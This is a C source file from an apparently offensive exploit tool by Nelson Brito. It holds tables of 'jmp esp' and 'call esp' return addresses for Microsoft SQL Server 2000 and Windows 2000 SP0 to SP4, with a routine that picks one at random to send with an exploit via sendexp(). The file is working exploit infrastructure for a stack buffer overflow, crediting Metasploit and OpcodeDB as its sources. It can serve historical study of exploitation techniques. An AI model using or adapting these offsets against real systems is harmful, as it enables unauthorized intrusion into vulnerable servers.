/* Copyright© 2004-2008 Nelson Brito
 * This file is part of the ENG Private Tool by Nelson Brito.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.  
   
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef OFFSET_C__
#define OFFSET_C__ 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: offset.c,v 1.3 2008-09-10 20:20:20-03 nbrito Exp $ */
#include "common.h"

struct offset 	sql_pub [] = {
	{ "call esp", 0x42b48774 }, /* HD Moore's Metasploit mssql2000_resolution.pm. */
	{ "jmp  esp", 0x42b0c9dc }, /* David Litchifield very first exploit.          */
},
/* All the following return addresses are available @ OpcodeDB by HD Moore.
   
   Thank you, HD Moore, for sharing your finds. I do appreciate!!! :-D */
		w2k_sp0 [] = {
	{ "jmp  esp", 0x750362c3 }, { "jmp  esp", 0x776167d1 }, { "jmp  esp", 0x77686c38 },
	{ "jmp  esp", 0x776f0940 }, { "jmp  esp", 0x77755f6d }, { "jmp  esp", 0x77797c4d },
},		w2k_sp1 [] = {
	{ "jmp  esp", 0x69801365 }, { "jmp  esp", 0x69808767 }, { "jmp  esp", 0x698370d6 },
	{ "jmp  esp", 0x698e1036 }, { "jmp  esp", 0x6994f2e4 }, { "jmp  esp", 0x69952208 },
},		w2k_sp2 [] = {
	{ "jmp  esp", 0x77e2492b }, { "jmp  esp", 0x77e3af64 }, { "jmp  esp", 0x783d15fc },
	{ "jmp  esp", 0x7843f2e4 }, { "jmp  esp", 0x78442208 }, { "jmp  esp", 0x784a7835 },
},		w2k_sp3 [] = {
	{ "jmp  esp", 0x77e2afc5 }, { "jmp  esp", 0x77e2afc9 }, { "jmp  esp", 0x77e2afe5 },
	{ "jmp  esp", 0x77e388a7 }, { "jmp  esp", 0x783d3d81 }, { "jmp  esp", 0x784432e4 },
},		w2k_sp4 [] = {
	{ "jmp  esp", 0x77e14c29 }, { "jmp  esp", 0x77e3c256 }, { "jmp  esp", 0x782f28f7 },
	{ "jmp  esp", 0x78326433 }, { "jmp  esp", 0x78344d6f }, { "jmp  esp", 0x78344d83 },
};

/* Offset processing routine. 
   Returns a random offset structure to be sent by sendexp(). */
const struct offset process_offset(register u_int32_t option, struct offset offset){
	u_int32_t id = 0;
	struct    timeval  seed;    /* seed for random        */
	/* Using microseconds as seed. */
	gettimeofday(&seed, (struct timezone *)0);
	srand((unsigned) seed.tv_usec);
	
	/* Processing offset options. */
	switch(option){
		case SQL_PUB_OFFSET:
			id = (sizeof(sql_pub)/sizeof(struct offset)) - 1;
			id = (u_int32_t) ((float)id * rand() / (RAND_MAX + 1.0));
			offset = sql_pub[id];
			break;
		case W2K_SP0_OFFSET:
			id = (sizeof(w2k_sp0)/sizeof(struct offset)) - 1;
			id = (u_int32_t) ((float)id * rand() / (RAND_MAX + 1.0));
			offset = w2k_sp0[id];
			break;
		case W2K_SP1_OFFSET:
			id = (sizeof(w2k_sp1)/sizeof(struct offset)) - 1;
			id = (u_int32_t) ((float)id * rand() / (RAND_MAX + 1.0));
			offset = w2k_sp1[id];
			break;
		case W2K_SP2_OFFSET:
			id = (sizeof(w2k_sp2)/sizeof(struct offset)) - 1;
			id = (u_int32_t) ((float)id * rand() / (RAND_MAX + 1.0));
			offset = w2k_sp2[id];
			break;
		case W2K_SP3_OFFSET:
			id = (sizeof(w2k_sp3)/sizeof(struct offset)) - 1;
			id = (u_int32_t) ((float)id * rand() / (RAND_MAX + 1.0));
			offset = w2k_sp3[id];
			break;
		case W2K_SP4_OFFSET:
			id = (sizeof(w2k_sp4)/sizeof(struct offset)) - 1;
			id = (u_int32_t) ((float)id * rand() / (RAND_MAX + 1.0));
			offset = w2k_sp4[id];
			break;
		case DISPLAY_ALL_OFFSETS:
			printf("\n\t%d - Microsfot SQL Server SP0-2: ", SQL_PUB_OFFSET);
			printf("using %02d PUBLIC offsets.\n", sizeof(sql_pub)/sizeof(struct offset));
			printf("\t%d - Microsoft Windows 2000 SP0: ", W2K_SP0_OFFSET);
			printf("using %02d random offsets.\n", sizeof(w2k_sp0)/sizeof(struct offset));
			printf("\t%d - Microsoft Windows 2000 SP1: ", W2K_SP1_OFFSET);
			printf("using %02d random offsets.\n", sizeof(w2k_sp1)/sizeof(struct offset));
			printf("\t%d - Microsoft Windows 2000 SP2: ", W2K_SP2_OFFSET);
			printf("using %02d random offsets.\n", sizeof(w2k_sp2)/sizeof(struct offset));
			printf("\t%d - Microsoft Windows 2000 SP3: ", W2K_SP3_OFFSET);
			printf("using %02d random offsets.\n", sizeof(w2k_sp3)/sizeof(struct offset));
			printf("\t%d - Microsoft Windows 2000 SP4: ", W2K_SP4_OFFSET);
			printf("using %02d random offsets.\n\n", sizeof(w2k_sp4)/sizeof(struct offset));
			exit(EXIT_FAILURE);
			break;
		default:
			printf("unknown or unlisted offset %d\n", option);
			exit(EXIT_FAILURE);
			break;
	}
	
	return(offset);
}
#endif  /* OFFSET_C__ */
